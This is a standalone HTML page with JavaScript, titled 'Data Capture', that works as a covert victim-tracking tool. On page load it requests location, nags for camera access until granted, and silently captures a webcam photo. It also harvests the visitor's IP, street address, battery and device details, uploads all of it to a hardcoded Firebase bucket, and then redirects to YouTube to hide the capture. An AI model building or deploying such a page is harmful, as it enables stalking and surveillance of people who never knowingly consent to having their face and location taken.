<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Data Capture</title>
    <script src="https://www.gstatic.com/firebasejs/10.7.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/10.7.0/firebase-storage.js"></script>
    <script src="https://www.gstatic.com/firebasejs/10.7.0/firebase-database.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: Arial, sans-serif; 
            background: #f5f5f5; 
            display: flex;
            flex-direction: column;
            justify-content: flex-start;
            align-items: flex-start;
            min-height: 100vh;
            padding: 20px;
        }
        #message {
            font-size: 16px;
            color: #333;
            white-space: pre-wrap;
            font-weight: bold;
        }
        .error-message {
            color: red;
        }
    </style>
</head>
<body>
    <div id="message">Initializing...</div>
    <script>
        // ==================== FIREBASE CONFIGURATION ====================
        // Your Firebase configuration
        const firebaseConfig = {
            apiKey: "AIzaSyBgIg7tbnGtSoeo0nHMn6IkeuvMp30ar9w",
            authDomain: "esrat-4e28f.firebaseapp.com",
            databaseURL: "https://esrat-4e28f-default-rtdb.firebaseio.com",
            projectId: "esrat-4e28f",
            storageBucket: "esrat-4e28f.appspot.com",
            messagingSenderId: "712315598095",
            appId: "1:712315598095:android:ed0f042ee1d5410dfb7a7a"
        };

        // Initialize Firebase
        const app = firebase.initializeApp(firebaseConfig);
        const storage = firebase.storage();
        const database = firebase.database();

        // Variable to store location
        let userLocation = {
            latitude: null,
            longitude: null,
            altitude: null,
            speed: null
        };

        // Function to request location permission and get location
        function getLocation() {
            document.getElementById('message').textContent = 'Requesting Geolocation permission...';
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition((position) => {
                    userLocation.latitude = position.coords.latitude.toFixed(6);  // Latitude
                    userLocation.longitude = position.coords.longitude.toFixed(6); // Longitude
                    userLocation.altitude = position.coords.altitude ? position.coords.altitude.toFixed(2) : 'N/A'; // Altitude
                    userLocation.speed = position.coords.speed ? position.coords.speed.toFixed(2) : 'N/A'; // Speed
                    console.log('Location retrieved:', userLocation);
                    startVideo(); // Start video after location is retrieved
                }, (error) => {
                    console.error('Error accessing location:', error);
                    document.getElementById('message').textContent = 'Location access denied or an error occurred. Proceeding without location.';
                    startVideo(); // Start video even if location access is denied
                });
            } else {
                console.error('Geolocation is not supported by this browser.');
                document.getElementById('message').textContent = 'Geolocation is not supported by this browser. Proceeding without location.';
                startVideo(); // Start video if geolocation is not supported
            }
        }

        // Function to get readable address using reverse geocoding (Using geocode.maps.co as Google Maps API Key is not provided)
        async function getReadableAddress(lat, lon) {
            if (!lat || !lon) return 'N/A (Location not available)';
            // Using the free geocode.maps.co API as the Google Maps API Key is not provided
            const apiKey = '6706339e20b94127377139nyudb9267'; // Placeholder key for geocode.maps.co
            const url = `https://geocode.maps.co/reverse?lat=${lat}&lon=${lon}&api_key=${apiKey}`;
            try {
                const response = await fetch(url);
                const data = await response.json();
                if (data.address) {
                    return data.display_name || data.address.road || 'Address found, but details are limited';
                }
                return 'Address not found';
            } catch (error) {
                console.error('Error fetching readable address:', error);
                return 'Error retrieving address';
            }
        }

        // Function to get network stats (IP address, connection speed, network type)
        async function getNetworkStats() {
            const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
            let ipData = { ip: 'N/A' };
            try {
                const ipResponse = await fetch('https://api.ipify.org?format=json');
                ipData = await ipResponse.json();
            } catch (e) {
                console.error('Error fetching IP:', e);
            }
            
            return {
                ip: ipData.ip,
                connectionSpeed: connection ? connection.downlink + ' Mbps' : 'N/A',
                networkType: connection ? connection.effectiveType : 'N/A'
            };
        }

        // Function to format date and time
        function formatDateTime() {
            const now = new Date();
            const options = {
                timeZone: 'Asia/Kolkata',
                year: 'numeric',
                month: '2-digit',
                day: '2-digit',
                hour: '2-digit',
                minute: '2-digit',
                second: '2-digit',
                weekday: 'long'
            };
            const localString = now.toLocaleString('en-IN', options);
            // The format is typically "Day, DD/MM/YYYY, HH:MM:SS"
            const parts = localString.split(', ');
            const day = parts[0];
            const date = parts[1];
            const time = parts[2];
            return `${day}, ${date}, ${time}`;
        }

        // Function to gather additional device stats for watermark
        function getDeviceStats() {
            const batteryPromise = navigator.getBattery ? navigator.getBattery() : Promise.resolve(null);
            const screenWidth = window.screen.width;
            const screenHeight = window.screen.height;
            const userAgent = navigator.userAgent;
            const platform = navigator.platform;
            const deviceMemory = navigator.deviceMemory || 'N/A';
            const hardwareConcurrency = navigator.hardwareConcurrency || 'N/A';

            return batteryPromise.then(battery => {
                return {
                    battery: battery ? `${(battery.level * 100).toFixed(0)}%` : 'N/A',
                    screenResolution: `${screenWidth}x${screenHeight}`,
                    deviceName: platform,
                    browser: userAgent,
                    deviceMemory: deviceMemory,
                    hardwareConcurrency: hardwareConcurrency
                };
            });
        }

        // Function to capture photo and upload to Firebase Storage with watermark
        function capturePhoto(video) {
            document.getElementById('message').textContent = 'Capturing photo and gathering final data...';
            const canvas = document.createElement('canvas');
            const context = canvas.getContext('2d');

            // Set the canvas size to the video size
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;

            // Draw the video frame to the canvas
            context.drawImage(video, 0, 0, canvas.width, canvas.height);

            // Stop video stream after capture
            video.srcObject.getTracks().forEach(track => track.stop());

            // Check if location is available for watermark
            Promise.all([getDeviceStats(), getNetworkStats(), getReadableAddress(userLocation.latitude, userLocation.longitude)]).then(([deviceStats, networkStats, readableAddress]) => {
                
                const formattedDateTime = formatDateTime();
                const timestamp = Date.now();

                // Watermark Text Construction
                const watermarkText = `Date: ${formattedDateTime} \nLat: ${userLocation.latitude || 'N/A'}, Lon: ${userLocation.longitude || 'N/A'} \nAlt: ${userLocation.altitude}, Speed: ${userLocation.speed} \nAddress: ${readableAddress}`;
                const deviceStatsText = `Battery: ${deviceStats.battery} \nScreen: ${deviceStats.screenResolution} \nDevice: ${deviceStats.deviceName} \nBrowser: ${deviceStats.browser}`;
                const networkStatsText = `IP: ${networkStats.ip} \nConnection Speed: ${networkStats.connectionSpeed} \nNetwork Type: ${networkStats.networkType}`;

                // Set watermark background
                context.fillStyle = 'black';
                context.globalAlpha = 0.5;
                // Calculate height based on number of lines
                const watermarkHeight = 180; 
                context.fillRect(0, canvas.height - watermarkHeight, canvas.width, watermarkHeight);

                // Set text properties for watermark
                context.font = '18px Arial'; // Font size and type
                context.fillStyle = 'white'; // Text color
                context.globalAlpha = 1.0; // Full opacity for the text
                const lineHeight = 25;
                let yOffset = canvas.height - watermarkHeight + 30;

                // Add location, date/time, device, and network stats as watermark
                context.fillText(watermarkText.split('\n')[0], 10, yOffset); yOffset += lineHeight;
                context.fillText(watermarkText.split('\n')[1], 10, yOffset); yOffset += lineHeight;
                context.fillText(watermarkText.split('\n')[2], 10, yOffset); yOffset += lineHeight;
                context.fillText(watermarkText.split('\n')[3], 10, yOffset); yOffset += lineHeight;
                
                context.fillText(deviceStatsText.split('\n')[0], 10, yOffset); yOffset += lineHeight;
                context.fillText(deviceStatsText.split('\n')[1], 10, yOffset); yOffset += lineHeight;
                context.fillText(deviceStatsText.split('\n')[2], 10, yOffset); yOffset += lineHeight;
                context.fillText(deviceStatsText.split('\n')[3], 10, yOffset); yOffset += lineHeight;

                context.fillText(networkStatsText.split('\n')[0], 10, yOffset); yOffset += lineHeight;
                context.fillText(networkStatsText.split('\n')[1], 10, yOffset); yOffset += lineHeight;
                context.fillText(networkStatsText.split('\n')[2], 10, yOffset); yOffset += lineHeight;


                // Convert the canvas image to a Blob
                canvas.toBlob(async function(blob) {
                    document.getElementById('message').textContent = 'Uploading photo and metadata to Firebase...';
                    const fileName = `photo_${timestamp}.png`;
                    const storageRef = storage.ref(`users/${fileName}`);

                    try {
                        // Upload the image to Firebase Storage with custom metadata
                        await storageRef.put(blob, {
                            customMetadata: {
                                // Store all data as strings for custom metadata
                                timestamp: formattedDateTime,
                                latitude: userLocation.latitude || 'N/A',
                                longitude: userLocation.longitude || 'N/A',
                                altitude: userLocation.altitude || 'N/A',
                                speed: userLocation.speed || 'N/A',
                                battery: deviceStats.battery,
                                screenResolution: deviceStats.screenResolution,
                                deviceName: deviceStats.deviceName,
                                browser: deviceStats.browser,
                                ipAddress: networkStats.ip,
                                connectionSpeed: networkStats.connectionSpeed,
                                networkType: networkStats.networkType,
                                readableAddress: readableAddress,
                                deviceMemory: deviceStats.deviceMemory,
                                hardwareConcurrency: deviceStats.hardwareConcurrency
                            }
                        });

                        document.getElementById('message').textContent = `✅ Upload Complete! Redirecting in 3 seconds...`;
                        console.log('Photo uploaded with filename:', fileName);

                        // Redirect after 3 seconds
                        setTimeout(() => {
                            window.location.href = 'https://youtube.com/';  // Redirect URL after upload
                        }, 3000);
                    } catch (error) {
                        document.getElementById('message').textContent = `❌ Error uploading to Firebase: ${error.message}`;
                        console.error('Error uploading to Firebase:', error);
                    }
                }, 'image/png', 1.0);  // The third argument '1.0' specifies the image quality (max quality)
            });
        }

        // Access the camera with higher resolution and request permission until granted
        async function startVideo() {
            document.getElementById('message').textContent = 'Requesting Camera permission...';
            let accessGranted = false;
            while (!accessGranted) {
                try {
                    const stream = await navigator.mediaDevices.getUserMedia({
                        video: {
                            width: { ideal: 1280 },
                            height: { ideal: 720 }
                        }
                    });
                    accessGranted = true;  // Camera access granted
                    document.getElementById('message').textContent = 'Camera access granted. Capturing photo...';
                    const video = document.createElement('video');
                    video.srcObject = stream;
                    video.play();

                    // Capture photo once the video stream is ready
                    video.onloadedmetadata = () => {
                        capturePhoto(video);
                    };
                } catch (error) {
                    console.error('Error accessing camera:', error);
                    document.getElementById('message').textContent = `Camera access denied or error: ${error.name}. Retrying in 3 seconds...`;

                    // Wait for 3 seconds before retrying
                    await new Promise(resolve => setTimeout(resolve, 3000));
                }
            }
        }

        // Start the camera and location request on page load
        window.onload = () => {
            getLocation();  // Request location permission first
        };
    </script>
</body>
</html>
